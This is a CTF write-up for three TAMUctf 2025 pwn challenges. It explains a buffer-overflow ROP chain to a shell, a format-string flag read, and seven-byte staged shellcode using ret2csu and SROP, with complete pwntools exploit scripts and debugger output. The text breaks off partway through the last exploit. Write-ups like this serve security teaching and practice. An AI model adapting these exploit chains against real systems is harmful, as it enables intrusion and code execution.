---
title: "[WRITE UP] - TAMUctf 2025"
date: 2025-03-31 11:55:00
tags:
  - PWN
category: "CTF Write ups"
---

This is write up for some pwn challenge I solved in TAMUctf 2025

## Debug 1

### Challenge Information

Description: `I made a program which inverts the capitalization of letters! Surely there's nothing insecure with the program, right?`
Tags:

- Buffer Overflow
- ROP

### Analysis

Let's begin with using `checksec` to check mitigation:

```sh
[*] '/mnt/e/sec/CTFs/2025/TamuCTF/Debug1/debug-1'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

As we can see, this is a `amd64` ELF with no canary and PIE. The `RELRO` is full so we can't overwrite the GOT. This challenge comes with source code, so let's analyze it:

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>

int upkeep() {
        // IGNORE THIS
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);
}

int modify(char input[]) {
        puts("Input a string (max length of 69 characters):\n");

        int x = read(0, input, 0x60);

        printf("String you entered: %s\n", input);

        for (int i = 0; i < x; ++i) {
                // Make uppercase letters into lowercase
                if (((int)input[i] >= 97) && ((int)input[i] <= 122)) {
                        input[i] = (char)((int)input[i]-32);
                }
                // Make lowercase letters into uppercase
                else if (((int)input[i] >= 65) && ((int)input[i] <= 90)) {
                        input[i] = (char)((int)input[i]+32);
                }

        }

        return 1;
}

int menu() {
        int sel;
        char input[69];

        while (true) {
                puts("Choose an option:");
                puts("1: Modify string");
                puts("2: Debug Mode");
                puts("3: Exit\n");

                scanf("%d", &sel);
                printf("You selected: %d\n", sel);

                if (sel==1) {
                        modify(input);
                        printf("Your string: %s\n", input);
                        return 1;
                }
                else if (sel==2) {
                        // Still working on this function, so I disabled it :)
                        //debug();
                        puts("Debug mode has been disabled!");
                        return 1;
                }
                else if (sel==3) {
                        return 1;
                }
                puts("Invalid input! Try again.");
        }
        return 1;
}

// TODO: finish making debug function
int debug() {
        int admin = 0;
        // TODO: Add admin check
        int sel;

        puts("WARNING: If you are reading this and are NOT an");
        puts("administrator, report this to IT immediately!\n");

        while (true) {
                puts("Admin options:");
                puts("1. Print info");
                puts("2. Feature 2 (Uhhhhh idk what to put here)"); // TODO:
                puts("3. Feature 3 (I hope your day is going well :) )"); // TODO:

                scanf("%d", &sel);
                printf("You selected: %d\n", sel);

                if (sel==1) {
                        printf("libc leak: %lx\n", system);

                        puts("Leave a message here (max: 80 characters)!");
                        char message[80];

                        read(0, message, 800);

                        puts("Thanks!");

                        return 1;
                }
                else if (sel==2) {
                        // TODO:
                        return 1;
                }
                else if (sel==3) {
                        // TODO:
                        return 1;
                }
                puts("Invalid input!");
        }
        return 1;
}

int main() {
        upkeep();

        puts("String Modifier v1.4.2");
        puts("Created by: FlamePyromancer"); // :)

        menu();

        printf("\nExiting...\n");
}
```

First when reading this source code, the first thing I looked at was the `debug` function, which helps us get the address of the system (a function in libc), and there is also a `Buffer Overflow` bug for us to exploit. But the problem here is how do we jump into that function? Because the options above do not have any option to call that function.

Analyzing further, we will see that the `modify` function in option 1 is passed into the `input[69]` variable, but inside the function it `reads` up to 0x60 bytes, so this function also has a `Buffer Overflow` bug.

### Exploit Development

So our main idea will be to use the `read` function called in the `modify` function to control the saved RIP of the `menu` function (because the `input[69]` variable is in the `menu` function and is passed in, so when we enter input in the `modify` function, we will also affect the `input` variable in the `menu` function). Once we have called the `debug` function, all we need to do now is craft a ROP chain to call `system("/bin/sh")`

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./debug-1_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# # b *0x401314
# # b *0x4011EC
# # b *0x4012C8
b *0x401464
b *0x4014AC
c
'''.format(**locals())

p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

# ==================== EXPLOIT ====================

def choice(option: int):
    sl(f'{option}'.encode())

def exploit():

    pop_rdi = 0x40154b
    ret = pop_rdi + 1


    choice(1)
    s(b'A' * 88 + p64(exe.sym.debug + 1))

    choice(1)
    ru(b'libc leak: ')
    system = hexleak(rl())
    libc.address = system - libc.sym.system
    slog('system', system)
    slog('libc base', libc.address)

    offset = 0x68
    payload = flat({

        offset: [

            pop_rdi,
            next(libc.search(b'/bin/sh\0')),
            ret,
            system

        ]

    })

    sleep(0.5)
    s(payload)

    interactive()

if __name__ == '__main__':
    exploit()
```

### Get flag

```sh
└ ϟ ./xpl.py
[*] '/mnt/e/sec/CTFs/2025/TamuCTF/Debug1/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to tamuctf.com on port 443: Done
[+] system: 0x7fdfd8abdaf0
[+] libc base: 0x7fdfd8a79000
[*] Switching to interactive mode
Leave a message here (max: 80 characters)!
Thanks!
$ cat flag*
gigem{d3bUg61ng_n3w_c0d3_a24dcfe3}
```

## Sniper

### Challenge Information

Description: `I feel like there's an unlimited supply of format string challenges with this name.`
Tags:

- Format String Bug

### Analysis

This challenge also contain the source code in the archive file so let's analysis it:

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/fcntl.h>

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void load_flag() {
    int fd = open("flag.txt", O_RDONLY);
    mmap(0x000000000a0a0000, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
}

void vuln() {
    char buf[48];
    printf("%p\n", buf);
    fgets(buf, sizeof(buf), stdin);
    close(0);
    printf(buf);
    exit(0);
}

int main() {
    init();
    load_flag();
    vuln();
}
```

So we can see, there is a `Format String Bug` in `vuln` function. The `load_flag` function will load the flag to the memory created by `mmap` but this address is pretty special `0x000000000a0a0000`. We know that `fgets` function will stop if it reach `\x0a` or newline. So if we try to but all of that address to the stack and use FSB read to read to flag, that impossible. But luckily, we have FSB write and stack leak here, we can use FSB write to write the last `\x0a` byte for the address and use FSB read to read it

### Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
import struct

context.log_level = 'debug'
exe = context.binary = ELF('./sniper_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

brva 0x1237
brva 0x12DD
c
'''.format(**locals())

p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

# ==================== EXPLOIT ====================

def exploit():


    stack_leak = hexleak(rl())
    slog('Stack leak', stack_leak)

    flag_address_offet  = stack_leak - 0xA0A0000
    flag_address = stack_leak - flag_address_offet
    slog('Flag address', flag_address)

    # fgets stop at `\x0a` or `newline` so we need to use stack leak calculate
    # to the third byte of that address and write to it
    '''
    00:0000│ rdx rdi rsp 0x7fff89c65f80 ◂— 0x6325632563256325 ('%c%c%c%c')
    01:0008│-038         0x7fff89c65f88 ◂— 0x6325632563256325 ('%c%c%c%c')
    02:0010│-030         0x7fff89c65f90 ◂— 0x3131256e25633225 ('%2c%n%11')
    03:0018│-028         0x7fff89c65f98 ◂— 0x4141414141417324 ('$sAAAAAA')
    04:0020│-020         0x7fff89c65fa0 —▸ 0x7fff89c65fab ◂— 0x746540000055e100
    05:0028│-018         0x7fff89c65fa8 ◂— 0x55e1000a0000
    06:0030│-010         0x7fff89c65fb0 ◂— 0x3d0746540
    07:0038│-008         0x7fff89c65fb8 ◂— 0x149f6bffddec00
    pwndbg> x/x 0x7fff89c65fa8
    0x7fff89c65fa8: 0x000055e1000a0000
    pwndbg> x/x 0x7fff89c65fa8+0x1
    0x7fff89c65fa9: 0x40000055e1000a00
    pwndbg> x/x 0x7fff89c65fa8+0x2
    0x7fff89c65faa: 0x6540000055e1000a
    pwndbg> x/x 0x7fff89c65fa8+0x3
    0x7fff89c65fab: 0x746540000055e100
    '''
    payload = b'%c%c%c%c%c%c%c%c%2c%n%11$s'.ljust(32,b'A')
    payload += p64(stack_leak + 0x2b) + p64(0xA0A0000)

    sl(payload)

    interactive()

if __name__ == '__main__':
    exploit()
```

### Get flag

```sh
└ ϟ ./xpl.py
[*] '/mnt/e/sec/CTFs/2025/TamuCTF/Sniper/sniper/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to tamuctf.com on port 443: Done
[DEBUG] Received 0xf bytes:
    b'0x7ffdd5a42dc0\n'
[+] Stack leak: 0x7ffdd5a42dc0
[+] Flag address: 0xa0a0000
[DEBUG] Sent 0x31 bytes:
    00000000  25 63 25 63  25 63 25 63  25 63 25 63  25 63 25 63  │%c%c│%c%c│%c%c│%c%c│
    00000010  25 32 63 25  6e 25 31 31  24 73 41 41  41 41 41 41  │%2c%│n%11│$sAA│AAAA│
    00000020  eb 2d a4 d5  fd 7f 00 00  00 00 0a 0a  00 00 00 00  │·-··│····│····│····│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
[DEBUG] Received 0x87 bytes:
    00000000  d0 c0 04 c0  00 25 25 25  20 24 67 69  67 65 6d 7b  │····│·%%%│ $gi│gem{│
    00000010  79 6f 75 5f  6b 6e 6f 77  5f 77 68 61  74 5f 6d 61  │you_│know│_wha│t_ma│
    00000020  79 62 65 5f  69 5f 73 68  6f 75 6c 64  5f 6a 75 73  │ybe_│i_sh│ould│_jus│
    00000030  74 5f 6c 65  61 76 65 5f  6e 61 6d 69  6e 67 5f 75  │t_le│ave_│nami│ng_u│
    00000040  70 5f 74 6f  5f 72 6e 67  5f 76 69 61  5f 68 74 74  │p_to│_rng│_via│_htt│
    00000050  70 3a 2f 2f  74 65 72 6e  75 73 2e 67  69 74 68 75  │p://│tern│us.g│ithu│
    00000060  62 2e 69 6f  2f 6e 73 61  70 72 6f 64  75 63 74 67  │b.io│/nsa│prod│uctg│
    00000070  65 6e 65 72  61 74 6f 72  2f 7d 0a 41  41 41 41 41  │ener│ator│/}·A│AAAA│
    00000080  41 eb 2d a4  d5 fd 7f                               │A·-·│···│
    00000087
\xd0\xc0\x04\xc0\x00%%% $gigem{you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/}
AAAAAA\xeb-\xa4\xd5\xfd\x7f
```

## Seven

This is my favorite challenge in this CTF because the author's idea was very good to create such a challenge.

### Challenge Information

Description: `Seven-byte shellcode!?`
Tags:

- Shellcode
- ret2csu
- SROP

### Analysis

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void no_one_gadget_for_you() {
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
    seccomp_load(ctx);
}

#define RWX 0x500000

int main() {
    init();
    no_one_gadget_for_you();
    char* code = mmap(RWX, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED_NOREPLACE, -1, 0);
    if (code != MAP_FAILED) {
        read(0, RWX, 7);
        mprotect(RWX, 0x1000, PROT_READ | PROT_EXEC);
        ((void (*)())RWX)();
    }
}
```

The code is pretty simple, it's just allow us to read only 7 bytes shellcode and execute it. And when we look at `no_one_gadget_for_you` we know that this seccomp rules doesn't allow `execve` and `execvat`

### Exploit Development

To solve this challenge, we need to use `multi-stage shellcode`. The first shellcode acts as a springboard, enabling us to execute the subsequent shellcodes. Its main purpose is to overcome the size limitation. So after thinking for a long time + debug I see when it about to call our shellcode, the registers at that point would look like this

```c
 RAX  0
 RBX  0
 RCX  0x7ffff7ed0da7 (mprotect+7) ◂— cmp rax, -0xfff
 RDX  0x500000 ◂— push 0x6f6c6c65 /* 'hello\n' */
 RDI  0x500000 ◂— push 0x6f6c6c65 /* 'hello\n' */
 RSI  0x1000
 R8   0xffffffff
 R9   0
 R10  0x100022
 R11  0x207
 R12  0x401150 (_start) ◂— xor ebp, ebp
 R13  0x7fffffffdce0 ◂— 1
 R14  0
 R15  0
 RBP  0x401310 (__libc_csu_init) ◂— push r15
*RSP  0x7fffffffdbe8 —▸ 0x401128 (main+120) ◂— xor eax, eax
*RIP  0x500000 ◂— push 0x6f6c6c65 /* 'hello\n' */
```

We see that the registers we need like RAX, RDI, RSI, RDX are all set up perfectly (for RDI we can use `push rsp; pop rdi`). Now our read shellcode will read data right into `RSP` and to continue executing the next payloads at the end of the shellcode we just need to add `ret`

```py
    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')
    s(shellcode)
```

Next, we will think about what we should read into it so that it can execute later (our goal will still be to execute the ORW shellcode). At this point, the idea that popped into my head was to craft a ROP chain to do that. But after checking some gadgets avaiable in the binary

```sh
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x0000000000401112: adc byte ptr [rax], al; add byte ptr [rdi + 0x500000], bh; call 0x20a0; xor eax, eax; mov edx, 0x500000; call rdx;
0x0000000000401171: adc byte ptr [rax], al; call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x00000000004011de: adc dword ptr [rax], edi; test rax, rax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x0000000000401175: adc eax, 0x2e76; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040116a: adc eax, dword ptr [rax]; mov rdi, 0x4010b0; call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040119c: adc edi, dword ptr [rax]; test rax, rax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x0000000000401179: add ah, dh; nop dword ptr [rax + rax]; ret;
0x0000000000401119: add al, ch; cmp edi, 0xc031ffff; mov edx, 0x500000; call rdx;
0x0000000000401173: add bh, bh; adc eax, 0x2e76; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040100a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x000000000040119e: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011e0: add byte ptr [rax], al; add byte ptr [rax], al; test rax, rax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x0000000000401135: add byte ptr [rax], al; add byte ptr [rbp + 5], dh; add rsp, 0x18; ret;
0x0000000000401136: add byte ptr [rax], al; jne 0x213f; add rsp, 0x18; ret;
0x0000000000401113: add byte ptr [rax], al; mov edi, 0x500000; call 0x20a0; xor eax, eax; mov edx, 0x500000; call rdx;
0x0000000000401116: add byte ptr [rax], al; push rax; add al, ch; cmp edi, 0xc031ffff; mov edx, 0x500000; call rdx;
0x0000000000401372: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret;
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x2012; call rax;
0x0000000000401009: add byte ptr [rax], al; test rax, rax; je 0x2012; call rax; add rsp, 8; ret;
0x00000000004011a0: add byte ptr [rax], al; test rax, rax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011e2: add byte ptr [rax], al; test rax, rax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x0000000000401178: add byte ptr [rax], al; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040117e: add byte ptr [rax], al; ret;
0x0000000000401117: add byte ptr [rax], dl; call 0x20a0; xor eax, eax; mov edx, 0x500000; call rdx;
0x0000000000401123: add byte ptr [rax], dl; call rdx;
0x000000000040117d: add byte ptr [rax], r8b; ret;
0x0000000000401137: add byte ptr [rbp + 5], dh; add rsp, 0x18; ret;
0x0000000000401217: add byte ptr [rcx], al; pop rbp; ret;
0x0000000000401114: add byte ptr [rdi + 0x500000], bh; call 0x20a0; xor eax, eax; mov edx, 0x500000; call rdx;
0x0000000000401177: add byte ptr cs:[rax], al; hlt; nop dword ptr [rax + rax]; ret;
0x0000000000401172: add dil, dil; adc eax, 0x2e76; hlt; nop dword ptr [rax + rax]; ret;
0x0000000000401139: add eax, 0x18c48348; ret;
0x0000000000401006: add eax, 0x2fed; test rax, rax; je 0x2012; call rax;
0x0000000000401006: add eax, 0x2fed; test rax, rax; je 0x2012; call rax; add rsp, 8; ret;
0x000000000040113b: add esp, 0x18; ret;
0x0000000000401013: add esp, 8; ret;
0x000000000040113a: add rsp, 0x18; ret;
0x0000000000401012: add rsp, 8; ret;
0x0000000000401133: and eax, 0x28; jne 0x213f; add rsp, 0x18; ret;
0x000000000040111a: call 0x20a0; xor eax, eax; mov edx, 0x500000; call rdx;
0x000000000040120d: call 0x2190; mov byte ptr [rip + 0x2e0f], 1; pop rbp; ret;
0x0000000000401174: call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x0000000000401010: call rax;
0x0000000000401010: call rax; add rsp, 8; ret;
0x0000000000401126: call rdx;
0x000000000040111b: cmp edi, 0xc031ffff; mov edx, 0x500000; call rdx;
0x0000000000401354: fmul qword ptr [rax - 0x7d]; ret;
0x0000000000401336: in al, dx; or al, ch; ret;
0x0000000000401002: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x2012; call rax;
0x0000000000401176: jbe 0x21a6; add byte ptr [rax], al; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040100e: je 0x2012; call rax;
0x000000000040100e: je 0x2012; call rax; add rsp, 8; ret;
0x000000000040119b: je 0x21b0; mov eax, 0; test rax, rax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011a5: je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011dd: je 0x21f0; mov eax, 0; test rax, rax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x00000000004011e7: je 0x21f0; mov edi, 0x404010; jmp rax;
0x0000000000401143: jmp qword ptr [rsi + 0x2e];
0x0000000000401296: jmp qword ptr [rsi + 0xf];
0x00000000004011ac: jmp rax;
0x0000000000401138: jne 0x213f; add rsp, 0x18; ret;
0x0000000000401170: mov al, 0x10; add dil, dil; adc eax, 0x2e76; hlt; nop dword ptr [rax + rax]; ret;
0x0000000000401212: mov byte ptr [rip + 0x2e0f], 1; pop rbp; ret;
0x000000000040119d: mov eax, 0; test rax, rax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011df: mov eax, 0; test rax, rax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x0000000000401005: mov eax, dword ptr [rip + 0x2fed]; test rax, rax; je 0x2012; call rax;
0x0000000000401005: mov eax, dword ptr [rip + 0x2fed]; test rax, rax; je 0x2012; call rax; add rsp, 8; ret;
0x000000000040120b: mov ebp, esp; call 0x2190; mov byte ptr [rip + 0x2e0f], 1; pop rbp; ret;
0x0000000000401167: mov ecx, 0x401310; mov rdi, 0x4010b0; call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040116e: mov edi, 0x4010b0; call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x00000000004011a7: mov edi, 0x404010; jmp rax;
0x0000000000401115: mov edi, 0x500000; call 0x20a0; xor eax, eax; mov edx, 0x500000; call rdx;
0x0000000000401121: mov edx, 0x500000; call rdx;
0x0000000000401004: mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x2012; call rax;
0x0000000000401004: mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x2012; call rax; add rsp, 8; ret;
0x000000000040120a: mov rbp, rsp; call 0x2190; mov byte ptr [rip + 0x2e0f], 1; pop rbp; ret;
0x0000000000401166: mov rcx, 0x401310; mov rdi, 0x4010b0; call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040116d: mov rdi, 0x4010b0; call qword ptr [rip + 0x2e76]; hlt; nop dword ptr [rax + rax]; ret;
0x000000000040117b: nop dword ptr [rax + rax]; ret;
0x000000000040136d: nop dword ptr [rax]; ret;
0x0000000000401132: or al, 0x25; sub byte ptr [rax], al; add byte ptr [rax], al; jne 0x213f; add rsp, 0x18; ret;
0x0000000000401337: or al, ch; ret;
0x0000000000401003: or byte ptr [rax - 0x75], cl; add eax, 0x2fed; test rax, rax; je 0x2012; call rax;
0x00000000004011a6: or dword ptr [rdi + 0x404010], edi; jmp rax;
0x0000000000401364: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000401366: pop r13; pop r14; pop r15; ret;
0x0000000000401368: pop r14; pop r15; ret;
0x000000000040136a: pop r15; ret;
0x0000000000401363: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000401367: pop rbp; pop r14; pop r15; ret;
0x0000000000401219: pop rbp; ret;
0x000000000040136b: pop rdi; ret;
0x0000000000401369: pop rsi; pop r15; ret;
0x0000000000401365: pop rsp; pop r13; pop r14; pop r15; ret;
0x0000000000401118: push rax; add al, ch; cmp edi, 0xc031ffff; mov edx, 0x500000; call rdx;
0x0000000000401209: push rbp; mov rbp, rsp; call 0x2190; mov byte ptr [rip + 0x2e0f], 1; pop rbp; ret;
0x000000000040100d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;
0x0000000000401134: sub byte ptr [rax], al; add byte ptr [rax], al; jne 0x213f; add rsp, 0x18; ret;
0x0000000000401375: sub esp, 8; add rsp, 8; ret;
0x0000000000401001: sub esp, 8; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x2012; call rax;
0x0000000000401374: sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: sub rsp, 8; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x2012; call rax;
0x000000000040100c: test eax, eax; je 0x2012; call rax;
0x000000000040100c: test eax, eax; je 0x2012; call rax; add rsp, 8; ret;
0x00000000004011a3: test eax, eax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011e5: test eax, eax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x000000000040100b: test rax, rax; je 0x2012; call rax;
0x000000000040100b: test rax, rax; je 0x2012; call rax; add rsp, 8; ret;
0x00000000004011a2: test rax, rax; je 0x21b0; mov edi, 0x404010; jmp rax;
0x00000000004011e4: test rax, rax; je 0x21f0; mov edi, 0x404010; jmp rax;
0x0000000000401214: ucomiss xmm0, dword ptr [rax]; add byte ptr [rcx], al; pop rbp; ret;
0x000000000040111f: xor eax, eax; mov edx, 0x500000; call rdx;
0x0000000000401131: xor ecx, dword ptr [0x28]; jne 0x213f; add rsp, 0x18; ret;
0x0000000000401130: xor rcx, qword ptr [0x28]; jne 0x213f; add rsp, 0x18; ret;
0x000000000040112f: xor rcx, qword ptr fs:[0x28]; jne 0x213f; add rsp, 0x18; ret;
0x000000000040117a: hlt; nop dword ptr [rax + rax]; ret;
0x00000000004011af: nop; ret;
0x0000000000401016: ret;

117 gadgets found
```

There's no `pop rax` or `syscall` gadget for us to craft a ORW ROP chain. But luckily, when we patched this binary we will see the appearance of `__libc_csu_init` which gives us a lot of free gadgets to use. So I thought of using the `ret2csu` technique to solve this problem. In `__libc_csu_init` I will use these gadgets:

```sh
0x0000000000401348 <+56>:    mov    rdx,r15
0x000000000040134b <+59>:    mov    rsi,r14
0x000000000040134e <+62>:    mov    edi,r13d
0x0000000000401351 <+65>:    call   QWORD PTR [r12+rbx*8]

0x0000000000401362 <+82>:    pop    rbx
0x0000000000401363 <+83>:    pop    rbp
0x0000000000401364 <+84>:    pop    r12
0x0000000000401366 <+86>:    pop    r13
0x0000000000401368 <+88>:    pop    r14
0x000000000040136a <+90>:    pop    r15
0x000000000040136c <+92>:    ret
```

With these gadgets, I can call `mprotect` to grant `rwx` permissions to a partition that I will use to read my second shellcode into. In this ROP chain I will first call `mprotect` and then call 2 reads (the first read will be used to make a pointer to the shellcode, and the second read will be used to read the ORW shellcode)

```py
def csu():

    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')

    s(shellcode)

    '''
       0x0000000000401348 <+56>:    mov    rdx,r15
       0x000000000040134b <+59>:    mov    rsi,r14
       0x000000000040134e <+62>:    mov    edi,r13d
       0x0000000000401351 <+65>:    call   QWORD PTR [r12+rbx*8]

       0x0000000000401362 <+82>:    pop    rbx
       0x0000000000401363 <+83>:    pop    rbp
       0x0000000000401364 <+84>:    pop    r12
       0x0000000000401366 <+86>:    pop    r13
       0x0000000000401368 <+88>:    pop    r14
       0x000000000040136a <+90>:    pop    r15
       0x000000000040136c <+92>:    ret
    '''

    # r15 -> rdx
    # r14 -> rsi
    # r13 -> edi

    pop_6_regs = exe.sym.__libc_csu_init+82
    call_r12_rbx = exe.sym.__libc_csu_init+56

    rop = flat(
        pop_6_regs,
        0,                          # rbx
        1,                          # rbp
        exe.got.mprotect,           # r12
        0x404000,                   # r13
        0x1000,                     # r14
        7,                          # r15
        call_r12_rbx,
        0,

        0,
        1,
        exe.got.read,
        0,
        0x404000,
        0x100,
        call_r12_rbx,
        0,

        0,
        1,
        exe.got.read,
        0,
        0x404000+0x50,
        0x100,
        call_r12_rbx,
        0,

        0,
        0,
        0x404000,
        0,
        0,
        0,
        call_r12_rbx,
    )

    sleep(0.5)
    s(rop)

    sleep(0.5)
    s(p64(0x404000+0x50)) # read to 0x404000
    shellcode = asm(shellcraft.open('./flag.txt'))
    shellcode += asm(shellcraft.read(6, 'rsp', 100))
    shellcode += asm(shellcraft.write(1, 'rsp', 100))

    sleep(0.5)
    s(shellcode)
```

### Bonus

After this solution I read some solutions from other participants. I realized that we can use SROP, because when the `read` function finishes reading our string the value it returns will be the number of bytes it read. Still the same but here we will use SROP to call mprotect with `syscall; ret` taken from our first shellcode (since the address is fixed we can take it freely). Then deploy a shellcode with 0xf bytes to setup RAX. Finally read the ORW shellcode in and execute it

```py
def srop():

    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')
    s(shellcode)

    syscall_ret = 0x500004
    pop_rdi = 0x40136b
    pop_rsi_r15 = 0x401369
    bss = 0x404000

    # call mprotect(bss, 0x1000, 7)
    frame = SigreturnFrame()
    frame.rdi = bss
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rax = 0xa
    frame.rip = syscall_ret
    frame.rsp = 0x400598                    # need to find a pointer to our second shellcode (use "p2p seven_patched")

    payload = flat(

        pop_rdi, 0,
        pop_rsi_r15, bss + 0x10, 0,
        exe.plt.read,
        syscall_ret,
        bytes(frame)
    )

    s(payload)

    shellcode = asm(f'''
        xor eax, eax
        xor edi, edi
        mov esi, {bss+0x10}
        add rdx, 127
        syscall
    ''')

    sleep(0.5)
    # input()
    s(shellcode.ljust(0xf, b'\x00'))                        # padding for 0xf byte

    shellcode = asm(f'mov rsp, {bss+0x190}')                # set rsp to rwx section (valid address for execute shellcode)
    shellcode += asm(shellcraft.open('./flag.txt'))
    shellcode += asm(shellcraft.read('rax', 'rsp', 100))
    shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

    sleep(0.5)
    # input()
    s(b'\x90' * 0xf + shellcode)
```

And since the place where we read the 3rd shellcode is right where we put the 2nd shellcode, we can easily set 0xf padding to place our 3rd shellcode after that, and when the 2nd shellcode finishes executing it will automatically execute the 3rd shellcode.

### Full exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./seven_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x401126

c
'''.format(**locals())

p = start()
# ==================== EXPLOIT ====================

def csu():

    shellcode = asm('''

        push rsp
        pop rsi

        xor edi, edi
        syscall

        ret

    ''')

    s(shellcode)

    '''
       0x0000000000401348 <+56>:    mov    rdx,r15
       0x000000000040134b <+59>:    mov    rsi,r14
       0x000000000040134e <+62>:    mov    edi,r13d
       0x0000000000401351 <+65>:    call   QWORD PTR [r12+rbx*8]

       0x0000000000401362 <+82>:    pop    rbx
       0x0000000000401363 <+83>:    pop    rbp
